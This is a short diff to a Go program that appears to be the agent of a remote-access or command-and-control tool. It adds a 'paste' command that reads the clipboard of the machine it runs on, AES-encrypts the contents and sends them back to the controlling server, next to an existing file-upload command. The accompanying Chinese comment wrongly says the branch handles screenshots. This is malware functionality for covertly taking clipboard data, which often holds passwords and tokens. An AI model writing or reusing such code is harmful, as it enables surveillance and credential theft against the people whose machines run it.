@@ -66,6 +66,17 @@ func main() {
 				client.SendOutput(ctx, cmd)
 				continue
 			}
+
+			//输入的命令为screenshot 就进入下面的流程
+			if tokens[0] == "paste" {
+				cmd.Out += util.Clipboard()
+				cmd.Out, _ = util.EncryptByAes([]byte(cmd.Out))
+				fmt.Println(cmd.In + cmd.Out)
+				client.SendOutput(ctx, cmd)
+
+				continue
+			}
+
 			//匹配上传命令
 			if tokens[0] == "upload" {
 				//fmt.Println(cmd.Out)
